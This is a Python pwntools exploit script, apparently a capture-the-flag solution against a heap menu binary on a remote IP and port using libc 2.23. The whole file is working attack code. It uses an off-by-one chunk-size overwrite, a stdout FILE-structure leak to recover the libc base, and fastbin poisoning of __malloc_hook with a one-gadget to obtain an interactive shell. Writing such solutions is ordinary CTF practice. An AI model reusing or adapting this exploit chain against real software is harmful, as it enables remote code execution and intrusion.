from pwn import*
#context.log_level ='DEBUG'
def add(size,content):
	p.sendlineafter('choice >','1')
	p.sendlineafter('content:',str(size))
	p.send(content)
def edit(index,size,content):
	p.sendlineafter('choice >','2')
	p.sendlineafter('index>',str(index))
	p.sendlineafter('length:',str(size))
	p.send(content)
def free(index):
	p.sendlineafter('choice >','3')
	p.sendlineafter('index>',str(index))
libc  = ELF('./libc-2.23.so',checksec=False)
while True:
	p = process('./main')
	p = remote('47.99.176.38',5204)
	try:
		add(0x18,'FMYY\n') #0
		add(0x48,'FMYY\n') #1
		add(0x60,'FMYY\n') #2
		add(0x20,'FMYY\n') #3
		edit(0,0x18,'\x00'*0x18 + '\xC1')
		free(1)
		free(2)
		add(0x48,'FMYY\n') #4
		add(1,'\xDD\x25') #5
		edit(4,0x48,'\x00'*0x48 + '\x71')
		add(0x60,'FMYY\n') #6
		add(0x60,'FMYY\n') #7
		edit(7,0x53,'\x00'*0x33 + p64(0xFBAD1800) + p64(0)*3 + '\x88')
		p.recvuntil(':>')
		libc.address = u64(p.recv(6).ljust(8,'\x00')) - libc.sym['_IO_2_1_stdin_']
		log.info('LIBC:\t' + hex(libc.address))
		free(5)
		edit(6,7,p64(libc.sym['__malloc_hook']-0x23))
		add(0x60,'\n')
		add(0x60,'\x00'*0x13 + p64(libc.address +0xF1147) + '\n')
		p.sendlineafter('choice >','1')
		p.sendlineafter('content:',str(16))
		break
	except:
		p.close()
		continue
p.interactive()


